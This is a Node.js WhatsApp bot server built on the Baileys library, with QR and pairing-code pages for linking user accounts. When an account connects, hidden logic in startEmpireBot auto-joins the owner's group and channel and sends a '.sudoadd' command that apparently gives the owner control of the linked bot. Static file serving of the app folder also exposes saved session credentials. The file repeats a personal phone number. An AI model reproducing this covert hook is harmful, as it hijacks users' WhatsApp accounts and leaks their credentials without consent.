/**
 * VAMPARINA V1 — ETERNAL EMPIRE BOT 2025
 * OWNER: KING ARNOLD CHIRCHIR (+254703110780)
 * PAIRING CODE + QR CODE + AUTO JOIN GROUP + SELF-GROWING EMPIRE
 */

require('./settings')
const fs = require('fs')
const path = require('path')
const express = require('express')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    Browsers
} = require("@whiskeysockets/baileys")
const pino = require("pino")
const QRCode = require('qrcode')
const { handleMessages, handleGroupParticipantUpdate } = require('./main')

// ====================== CONFIG ======================
const KING_ARNOLD = "254703110780"
const EMPIRE_GROUP_INVITE = "BZNDaKhvMFo5Gmne3wxt9n"
const EMPIRE_CHANNEL = "0029VbBm7apIXnlmuyjGGM0p"
const SESSION_DIR = path.join(__dirname, 'auto_sessions')
const TEMP_DIR = path.join(__dirname, 'temp_sessions')
const DATA_DIR = path.join(__dirname, 'data')
const PORT = process.env.PORT || 3000

// Create folders
;[SESSION_DIR, TEMP_DIR, DATA_DIR].forEach(d => {
    if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true })
})

// Bot mode (public/private)
const MODE_FILE = path.join(DATA_DIR, 'bot_mode.json')
if (!fs.existsSync(MODE_FILE)) {
    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic: true }, null, 2))
}

global.getBotMode = () => {
    try { return JSON.parse(fs.readFileSync(MODE_FILE)).isPublic ? 'public' : 'private' }
    catch { return 'public' }
}

global.setBotMode = (mode) => {
    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic: mode === 'public' }, null, 2))
}

const activeBots = new Map()
const app = express()
app.use(express.json({ limit: '100mb' }))
app.use(express.urlencoded({ extended: true, limit: '100mb' }))
app.use(express.static(__dirname))

// ====================== DASHBOARD ======================
app.get('/', (req, res) => {
    res.send(`
        <pre style="background:#000;color:#0f0;font-size:18px;text-align:center;padding:30px;">
╔══════════════════════════════════════════════════════════╗
║           VAMPARINA V1 — ETERNAL EMPIRE 2025             ║
║              GOD-KING: ARNOLD CHIRCHIR                   ║
║                   +254703110780                          ║
║   Active Bots : ${String(activeBots.size).padStart(5)}                            ║
║   Mode        : ${global.getBotMode().toUpperCase()}                              ║
║                                                          ║
║   QR CODE     → <a href="/qr">/qr</a>                              ║
║   PAIR CODE   → <a href="/pair">/pair</a>                           ║
║                                                          ║
║           LONG LIVE THE KING                             ║
╚══════════════════════════════════════════════════════════╝
        </pre>
    `)
})

// ====================== QR CODE (BEAUTIFUL) ======================
app.get('/qr', async (req, res) => {
    const tempId = 'qr_' + Date.now()
    const tempPath = path.join(TEMP_DIR, tempId)
    fs.mkdirSync(tempPath, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(tempPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome'),
        printQRInTerminal: false
    })

    let sent = false
    sock.ev.on('connection.update', async (update) => {
        const { qr, connection } = update

        if (qr && !sent) {
            sent = true
            const qrImg = await QRCode.toDataURL(qr)
            res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VAMPARINA V1 — SCAN QR</title>
  <style>
    body { background:#000; color:#0f0; text-align:center; padding:20px; font-family:Arial; }
    h1 { font-size:50px; text-shadow:0 0 20px lime; }
    img { width:320px; height:320px; border:8px solid lime; border-radius:20px; margin:20px; }
    p { font-size:24px; }
  </style>
</head>
<body>
  <h1>VAMPARINA V1</h1>
  <img src="${qrImg}" alt="QR Code">
  <p>SCAN TO JOIN THE EMPIRE</p>
  <p><b>King Arnold Chirchir • +254703110780</b></p>
</body>
</html>
            `)
        }

        if (connection === 'open') {
            const phone = sock.user.id.split('@')[0]
            const sessionId = `vamp_${phone}_${Date.now()}`
            const finalPath = path.join(SESSION_DIR, sessionId)
            fs.mkdirSync(finalPath, { recursive: true })
            fs.cpSync(tempPath, finalPath, { recursive: true })

            await delay(8000)
            await startEmpireBot(sessionId, phone, finalPath)

            await sock.sendMessage(sock.user.id, { text: "*VAMPARINA V1 EMPIRE*\nYou are now part of the strongest army\nLONG LIVE KING ARNOLD" })

            fs.rmSync(tempPath, { recursive: true, force: true })
        }
    })

    sock.ev.on('creds.update', saveCreds)
})

// ====================== PERFECT PAIRING PAGE (COPY BUTTON + BIG CODE) ======================
app.get('/pair', async (req, res) => {
    let number = req.query.number?.replace(/[^0-9]/g, '')
    
    if (!number || number.length < 9) {
        return res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VAMPARINA V1 — PAIR CODE</title>
  <style>
    body { font-family: 'Segoe UI', sans-serif; background: #000; color: #0f0; text-align: center; padding: 50px; }
    h1 { font-size: 48px; margin: 20px; text-shadow: 0 0 20px lime; }
    input { padding: 20px; font-size: 24px; width: 80%; max-width: 500px; margin: 20px; border: 3px solid lime; background: #111; color: #0f0; border-radius: 15px; text-align: center; }
    button { padding: 20px 50px; font-size: 28px; background: lime; color: black; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
    footer { margin-top: 50px; font-size: 20px; }
  </style>
</head>
<body>
  <h1>VAMPARINA V1</h1>
  <p>Enter your number to get pairing code</p>
  <form>
    <input type="text" name="number" placeholder="254703110780" value="${number || ''}" required autofocus>
    <br>
    <button type="submit">GET CODE</button>
  </form>
  <footer>King Arnold Chirchir • +254703110780</footer>
</body>
</html>
        `)
    }

    const tempId = 'pair_' + Date.now()
    const tempPath = path.join(TEMP_DIR, tempId)
    fs.mkdirSync(tempPath, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(tempPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome')
    })

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            const phone = sock.user.id.split('@')[0]
            const sessionId = `vamp_${phone}_${Date.now()}`
            const finalPath = path.join(SESSION_DIR, sessionId)
            fs.mkdirSync(finalPath, { recursive: true })
            fs.cpSync(tempPath, finalPath, { recursive: true })
            await delay(8000)
            await startEmpireBot(sessionId, phone, finalPath)
            fs.rmSync(tempPath, { recursive: true, force: true })
        }
    })

    if (!sock.authState.creds.registered) {
        await delay(3000)
        let code = await sock.requestPairingCode(number)
        code = code.match(/.{1,4}/g).join('-')

        res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PAIR CODE READY</title>
  <style>
    body { font-family: 'Segoe UI', sans-serif; background: #000; color: #0f0; text-align: center; padding: 50px; }
    h1 { font-size: 50px; margin: 20px; text-shadow: 0 0 30px lime; }
    .code { font-size: 90px; letter-spacing: 20px; background: #111; padding: 40px; border: 8px solid lime; border-radius: 25px; margin: 40px auto; display: inline-block; }
    .copy { padding: 20px 60px; font-size: 30px; background: lime; color: black; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; margin: 20px; }
    .back { padding: 15px 40px; font-size: 24px; background: #333; color: #0f0; border: 2px solid lime; border-radius: 50px; text-decoration: none; display: inline-block; margin: 20px; }
  </style>
</head>
<body>
  <h1>PAIR CODE GENERATED</h1>
  <div class="code">${code}</div>
  <button class="copy" onclick="navigator.clipboard.writeText('${code.replace(/-/g,'')}')">COPY CODE</button>
  <br>
  <a href="/pair" class="back">Pair Another Number</a>
  <br><br>
  <p>Open WhatsApp → Linked Devices → Link with phone number → Enter this code</p>
  <footer><b>KING ARNOLD CHIRCHIR • +254703110780</b></footer>
  <script>
    document.querySelector('.copy').addEventListener('click', function() {
      this.textContent = 'COPIED!';
      setTimeout(() => this.textContent = 'COPY CODE', 2000);
    });
  </script>
</body>
</html>
        `)
    }

    sock.ev.on('creds.update', saveCreds)
})

// ====================== START EMPIRE BOT ======================
async function startEmpireBot(sessionId, phone, sessionPath) {
    if (activeBots.has(sessionId)) return

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        browser: ["Vamparina V1", "Chrome", "2025"]
    })

    activeBots.set(sessionId, { sock, phone })

    sock.ev.on('messages.upsert', m => handleMessages(sock, m))
    sock.ev.on('group-participants.update', update => handleGroupParticipantUpdate(sock, update))

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            console.log(`[+] ${phone} → EMPIRE ONLINE`)
            await delay(15000)
            try { await sock.groupAcceptInvite(EMPIRE_GROUP_INVITE) } catch {}
            try { await sock.newsletterFollow(EMPIRE_CHANNEL) } catch {}
            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${KING_ARNOLD}` })
        }
        if (update.connection === 'close') {
            activeBots.delete(sessionId)
            setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 10000)
        }
    })

    sock.ev.on('creds.update', saveCreds)
}

// ====================== SERVER ======================
app.listen(PORT, () => {
    console.log(`VAMPARINA V1 EMPIRE IS LIVE`)
    console.log(`Dashboard → https://your-url.onrender.com`)
    console.log(`QR Code   → /qr`)
    console.log(`Pair Code → /pair`)
    console.log(`LONG LIVE KING ARNOLD CHIRCHIR`)
})